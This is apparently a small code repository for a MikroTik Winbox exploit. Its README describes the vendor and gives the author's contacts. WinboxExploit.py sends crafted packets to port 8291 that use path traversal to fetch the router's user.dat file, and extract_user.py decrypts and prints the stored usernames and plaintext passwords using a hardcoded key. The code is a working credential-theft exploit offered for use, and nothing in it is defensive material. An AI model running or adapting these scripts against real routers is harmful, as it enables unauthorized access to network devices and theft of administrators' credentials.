# Repository Information
Name: 0day-mikrotik

# Files

File: config
================================================
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://gitlab.com/gavz/0day-mikrotik.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
================================================

File: description
================================================
Unnamed repository; edit this file 'description' to name the repository.
================================================

File: extract_user.py
================================================
#!/usr/bin/env python3
import sys, hashlib
def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()
    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
    return passw.split("\x00")[0]
def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]
    user_len = user_data[0]
    pass_len = pass_data[0]
    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]
    return username, password
def get_pair(data):
    user_list = []
    entries = data.split(b"M2")[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue
        pass_plain = decrypt_password(user, pass_encrypted)
        user  = user.decode("ascii")
        user_list.append((user, pass_plain))
    return user_list
def dump(data):
    user_pass = get_pair(data)
    for u, p in user_pass:
        print("User:", u)
        print("Pass:", p)
        print()
if __name__ == "__main__":
    if len(sys.argv) == 2:
        if sys.argv[1] == "-":
            user_file = sys.stdin.buffer.read()
        else:
            user_file = open(sys.argv[1], "rb").read()
        dump(user_file)
    else:
        print("Usage:")
        print("\tFrom file: \t", sys.argv[0], "user.dat")
        print("\tFrom stdin:\t", sys.argv[0], "-")
================================================

File: README.md
================================================
# Project Information
<p><b><h6>Name Project :</b>0day Mikrotik</p>
<p><b>Last version  :</b>1.0.0</p>
<p><b>Last updated :</b> 25/07/2018</p>
<p><b>Programming language :</b> Python</p>
<p><b>youtube : </b>https://youtu.be/h6JSNFhQUN8</p>
<p><b>Company name : </b><a target="_black" href="http://acyber.ir">acyber</a> (IT Security Lab Iran)</p></h6>
<h4>Mikrotik</h4>
<p>
MikroTik is a Latvian company which was founded in 1996 to develop routers and wireless ISP systems. MikroTik now provides hardware and software for Internet connectivity in most of the countries around the world. Our experience in using industry standard PC hardware and complete routing systems allowed us in 1997 to create the RouterOS software system that provides extensive stability, controls, and flexibility for all kinds of data interfaces and routing. In 2002 we decided to make our own hardware, and the RouterBOARD brand was born. We have resellers in most parts of the world, and customers in probably every country on the planet. Our company is located in Riga, the capital city of Latvia and has more than 140 employees.
<br>
From Winbox v3.14, the following security features are used:<br>
Winbox.exe is signed with an Extended Validation certificate, issued by SIA Mikrotīkls (MikroTik).<br>
WinBox uses ECSRP for key exchange and authentication (requires new winbox version).<br>
Both sides verify that other side knows password (no man in the middle attack is possible).<br>
Winbox in RoMON mode requires that agent is the latest version to be able to connect to latest version routers.<br>
Winbox uses AES128-CBC-SHA as encryption algorithm (requires winbox version 3.14 or above).<br>
</p>
# Contacts
<ul>
<li>   Author      :   Mohamamd javad Joshani Disfani (mr.mtwoj)
<li>   Linkedin    :   https://ir.linkedin.com/in/joshani
<li>   E-Mail      :   mr.mtwoj@gmail.com
<li>   Website     :   www.acyber.ir
<li>   Twitter     :   <a href="https://twitter.com/MrMtwoj">@mrmtwoj</a>
<li>   Github      :   https://github.com/mrmtwoj/0day-mikrotik
</ul>
================================================

File: WinboxExploit.py
================================================
#!/usr/bin/env python3
import socket
import sys
from extract_user import dump
a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00]
b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00]
if __name__ == "__main__":
     try:
          ip = sys.argv[1]
     except:
          print("Usage: python PoC.py [IP_ADDRESS]")
     #Initialize Socket
     s = socket.socket()
     s.settimeout(3)
     s.connect((ip, 8291))
     #Convert to bytearray for manipulation
     a = bytearray(a)
     b = bytearray(b)
     #Send hello and recieve the sesison id
     s.send(a)
     d = bytearray(s.recv(1024))
     #Replace the session id in template
     b[19] = d[38]
     #Send the edited response
     s.send(b)
     d = bytearray(s.recv(1024))
     #Get results
     print(ip)
     dump(d[55:])